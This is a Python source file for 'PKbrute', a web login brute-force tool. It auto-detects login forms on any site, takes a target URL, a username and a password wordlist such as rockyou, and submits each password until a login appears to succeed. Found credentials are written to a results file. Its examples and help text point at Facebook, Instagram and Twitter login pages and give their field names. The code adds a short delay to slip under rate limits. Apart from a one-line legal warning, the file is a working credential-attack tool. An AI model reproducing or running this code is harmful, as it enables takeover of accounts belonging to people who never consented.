#!/usr/bin/env python3
"""
PKbrute - Web Login Brute Force Tool (Enhanced)
Developed by Pankaj
For authorized security testing only
"""

import requests
import sys
import time
from urllib.parse import urljoin, urlparse
from colorama import init, Fore, Style
import os
import re

# Initialize colorama
init(autoreset=True)

# Branding
BANNER = f"""
{Fore.CYAN}{'='*60}
{Fore.RED}██████╗ ██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
{Fore.RED}██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
{Fore.RED}██████╔╝█████╔╝     ██████╔╝██████╔╝██║   ██║   ██║   █████╗
{Fore.RED}██╔═══╝ ██╔═██╗     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
{Fore.RED}██║     ██║  ██╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
{Fore.RED}╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
{Fore.GREEN}              Advanced Web Login Brute Force Tool
{Fore.YELLOW}                   Developed by Pankaj | PKbrute v2.0
{Fore.CYAN}{'='*60}
{Fore.RED}[!] LEGAL WARNING: Only use on systems you own or have permission!
{Style.RESET_ALL}
"""

class PKbrute:
    def __init__(self):
        self.session = requests.Session()
        
    def print_banner(self):
        print(BANNER)
        
    def smart_detect_login(self, url):
        """Intelligently detect login forms on ANY website"""
        print(f"{Fore.CYAN}[*] Analyzing {url} for login forms...{Style.RESET_ALL}")
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = self.session.get(url, timeout=10, headers=headers)
            
            # Try to parse with BeautifulSoup
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Method 1: Find forms with password field
                forms = soup.find_all('form')
                for form in forms:
                    password_fields = form.find_all('input', {'type': 'password'})
                    if password_fields:
                        # Found login form
                        action = form.get('action', '')
                        if not action:
                            action = url
                        else:
                            action = urljoin(url, action)
                        
                        # Find username/email field
                        username_field = None
                        for field in form.find_all('input'):
                            field_type = field.get('type', 'text')
                            field_name = field.get('name', '').lower()
                            field_id = field.get('id', '').lower()
                            
                            # Check for common username field names
                            if field_type in ['text', 'email', 'tel']:
                                if any(keyword in field_name or keyword in field_id 
                                       for keyword in ['user', 'email', 'login', 'username', 'phone']):
                                    username_field = field.get('name')
                                    break
                            
                            # If no username field found yet, take first text field
                            if not username_field and field_type == 'text':
                                username_field = field.get('name')
                        
                        # If still no username field, use default
                        if not username_field:
                            username_field = 'username'
                        
                        password_field = password_fields[0].get('name', 'password')
                        method = form.get('method', 'post').lower()
                        
                        print(f"{Fore.GREEN}[✓] Login form successfully detected!{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}    → Form Action: {action}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}    → Method: {method.upper()}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}    → Username field: {username_field}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}    → Password field: {password_field}{Style.RESET_ALL}")
                        
                        return {
                            'action': action,
                            'method': method,
                            'username_field': username_field,
                            'password_field': password_field,
                            'found': True
                        }
                
                # Method 2: Look for login patterns in JavaScript
                if 'login' in response.text.lower() or 'signin' in response.text.lower():
                    print(f"{Fore.YELLOW}[!] Login form may be JavaScript-based{Style.RESET_ALL}")
                    return self.fallback_detection(url)
                
            except ImportError:
                # If BeautifulSoup not installed, use regex
                return self.regex_detection(url, response.text)
                
            print(f"{Fore.RED}[!] Could not auto-detect login form{Style.RESET_ALL}")
            return self.manual_help()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            return self.manual_help()
    
    def regex_detection(self, url, html):
        """Fallback detection using regex"""
        # Look for password field patterns
        password_pattern = r'<input[^>]*type=["\']password["\'][^>]*name=["\']([^"\']+)["\']'
        password_matches = re.findall(password_pattern, html, re.IGNORECASE)
        
        if password_matches:
            print(f"{Fore.GREEN}[✓] Found password field using pattern matching{Style.RESET_ALL}")
            password_field = password_matches[0]
            
            # Look for username field
            user_pattern = r'<input[^>]*type=["\'](?:text|email)["\'][^>]*name=["\']([^"\']+)["\']'
            user_matches = re.findall(user_pattern, html, re.IGNORECASE)
            username_field = user_matches[0] if user_matches else 'username'
            
            return {
                'action': url,
                'method': 'post',
                'username_field': username_field,
                'password_field': password_field,
                'found': True
            }
        
        return {'found': False}
    
    def fallback_detection(self, url):
        """Handle JavaScript-heavy login pages"""
        print(f"{Fore.YELLOW}[!] This website may use JavaScript/React login{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[?] Do you know the form field names? (yes/no): {Style.RESET_ALL}", end='')
        choice = input().lower()
        
        if choice == 'yes':
            username_field = input(f"{Fore.CYAN}[?] Enter username field name: {Style.RESET_ALL}")
            password_field = input(f"{Fore.CYAN}[?] Enter password field name: {Style.RESET_ALL}")
            submit_url = input(f"{Fore.CYAN}[?] Enter login action URL (press Enter for same URL): {Style.RESET_ALL}")
            
            if not submit_url:
                submit_url = url
                
            return {
                'action': submit_url,
                'method': 'post',
                'username_field': username_field,
                'password_field': password_field,
                'found': True
            }
        else:
            return self.manual_help()
    
    def manual_help(self):
        """Simple manual input for beginners"""
        print(f"\n{Fore.YELLOW}{'='*50}")
        print(f"MANUAL CONFIGURATION HELP")
        print(f"{'='*50}{Style.RESET_ALL}")
        print(f"""
{Fore.CYAN}1. Go to the login page of the website
2. Right-click → "Inspect" or "View Page Source"  
3. Press Ctrl+F and search for "password"
4. Look for something like: name="PASSWORD_FIELD_NAME"
5. That's your password field name
6. Similarly, look for username/email field name

{Fore.GREEN}Example Facebook:
  • Username field: email
  • Password field: pass

{Fore.GREEN}Example Instagram:
  • Username field: username  
  • Password field: password

{Fore.GREEN}Example Twitter:
  • Username field: session[username_or_email]
  • Password field: session[password]

{Fore.CYAN}Enter the information below:{Style.RESET_ALL}
        """)
        
        action_url = input(f"{Fore.CYAN}[?] Login form action URL (press Enter for same page): {Style.RESET_ALL}")
        if not action_url:
            action_url = input(f"{Fore.CYAN}[?] Current page URL: {Style.RESET_ALL}")
        
        method = input(f"{Fore.CYAN}[?] Form method (post/get) [DEFAULT: post]: {Style.RESET_ALL}") or 'post'
        username_field = input(f"{Fore.CYAN}[?] Username field name: {Style.RESET_ALL}")
        password_field = input(f"{Fore.CYAN}[?] Password field name: {Style.RESET_ALL}")
        
        return {
            'action': action_url,
            'method': method.lower(),
            'username_field': username_field,
            'password_field': password_field,
            'found': True
        }
    
    def test_login(self, url, username_field, password_field, username, password):
        """Test login credentials"""
        # Prepare login data
        login_data = {
            username_field: username,
            password_field: password
        }
        
        # Common additional fields for popular sites
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': urlparse(url).scheme + '://' + urlparse(url).netloc,
            'Referer': url
        }
        
        try:
            response = self.session.post(url, data=login_data, headers=headers, 
                                        timeout=10, allow_redirects=True)
            
            # Check for successful login
            response_text = response.text.lower()
            response_url = response.url.lower()
            
            # Success indicators
            success_keywords = ['dashboard', 'home', 'feed', 'profile', 'account', 
                              'logout', 'signout', 'welcome', 'success']
            
            # Failure indicators  
            failure_keywords = ['invalid', 'incorrect', 'failed', 'error', 'wrong',
                              'try again', 'not found', 'incorrect']
            
            # Check if redirected away from login
            if 'login' not in response_url and 'signin' not in response_url:
                return True
            
            # Check for success keywords
            if any(keyword in response_text for keyword in success_keywords):
                if not any(keyword in response_text for keyword in failure_keywords):
                    return True
            
            return False
            
        except Exception as e:
            return False
    
    def run_attack(self):
        """Main attack function"""
        self.print_banner()
        
        # Get target URL
        print(f"{Fore.YELLOW}[?] Enter the login page URL (e.g., https://www.facebook.com/login){Style.RESET_ALL}")
        target_url = input(f"{Fore.GREEN}URL: {Style.RESET_ALL}").strip()
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        # Auto-detect login form
        login_info = self.smart_detect_login(target_url)
        
        if not login_info.get('found', False):
            print(f"{Fore.RED}[!] Could not detect. Please try manual mode.{Style.RESET_ALL}")
            return
        
        # Get username
        print(f"\n{Fore.YELLOW}[?] Enter the username/email to test{Style.RESET_ALL}")
        username = input(f"{Fore.GREEN}Username: {Style.RESET_ALL}").strip()
        
        # Get wordlist
        print(f"\n{Fore.YELLOW}[?] Enter the FULL path to password wordlist{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Example: /home/kali/wordlist.txt{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Or use Kali's wordlist: /usr/share/wordlists/rockyou.txt{Style.RESET_ALL}")
        wordlist_path = input(f"{Fore.GREEN}Wordlist path: {Style.RESET_ALL}").strip()
        
        # Check wordlist
        if not os.path.exists(wordlist_path):
            print(f"{Fore.RED}[!] Wordlist not found!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[?] Create a test wordlist? (yes/no): {Style.RESET_ALL}", end='')
            if input().lower() == 'yes':
                wordlist_path = self.create_test_wordlist()
            else:
                return
        
        # Load passwords
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except:
            print(f"{Fore.RED}[!] Cannot read wordlist{Style.RESET_ALL}")
            return
        
        # Confirm attack
        print(f"\n{Fore.RED}{'='*50}")
        print(f"TARGET: {target_url}")
        print(f"USERNAME: {username}")
        print(f"PASSWORDS TO TRY: {len(passwords)}")
        print(f"{'='*50}{Style.RESET_ALL}")
        
        confirm = input(f"{Fore.RED}[!] Start attack? (yes/no): {Style.RESET_ALL}")
        if confirm.lower() != 'yes':
            print(f"{Fore.YELLOW}[!] Attack cancelled{Style.RESET_ALL}")
            return
        
        # Start attack
        print(f"\n{Fore.CYAN}[*] Starting brute force attack...{Style.RESET_ALL}\n")
        start_time = time.time()
        
        for idx, password in enumerate(passwords, 1):
            # Show progress
            percent = (idx / len(passwords)) * 100
            print(f"{Fore.YELLOW}[{idx}/{len(passwords)}] Testing: {password[:20]}{'...' if len(password) > 20 else ''} - {percent:.1f}%{Style.RESET_ALL}", end='\r')
            
            # Test password
            success = self.test_login(
                login_info['action'],
                login_info['username_field'],
                login_info['password_field'],
                username,
                password
            )
            
            if success:
                print(f"\n\n{Fore.GREEN}{'='*60}")
                print(f"{Fore.GREEN}🎉 SUCCESS! VALID PASSWORD FOUND! 🎉")
                print(f"{Fore.GREEN}{'='*60}")
                print(f"{Fore.CYAN}Username: {username}")
                print(f"{Fore.GREEN}Password: {password}")
                print(f"{Fore.CYAN}Attack time: {time.time() - start_time:.2f} seconds")
                print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                
                # Save results
                with open('pkbrute_results.txt', 'a') as f:
                    f.write(f"Target: {target_url}\n")
                    f.write(f"Username: {username}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Time: {time.ctime()}\n")
                    f.write("-" * 50 + "\n")
                
                print(f"\n{Fore.CYAN}[✓] Results saved to pkbrute_results.txt{Style.RESET_ALL}")
                return
            
            # Small delay to avoid rate limiting
            time.sleep(0.05)
        
        # Attack finished
        print(f"\n\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}❌ ATTACK COMPLETED - NO VALID PASSWORD FOUND ❌")
        print(f"{Fore.RED}{'='*60}")
        print(f"{Fore.YELLOW}Passwords tried: {len(passwords)}")
        print(f"{Fore.YELLOW}Time elapsed: {time.time() - start_time:.2f} seconds")
        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
    
    def create_test_wordlist(self):
        """Create a simple test wordlist"""
        test_passwords = [
            'admin', 'admin123', 'password', '123456', '123456789',
            'qwerty', 'abc123', 'monkey', 'letmein', 'welcome',
            'admin@123', 'Password123', 'root', 'test', 'demo'
        ]
        
        test_path = os.path.expanduser('~/pkbrute_test_wordlist.txt')
        with open(test_path, 'w') as f:
            for pwd in test_passwords:
                f.write(pwd + '\n')
        
        print(f"{Fore.GREEN}[✓] Test wordlist created at: {test_path}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Contains {len(test_passwords)} common passwords{Style.RESET_ALL}")
        return test_path

def main():
    tool = PKbrute()
    try:
        tool.run_attack()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Attack interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
    
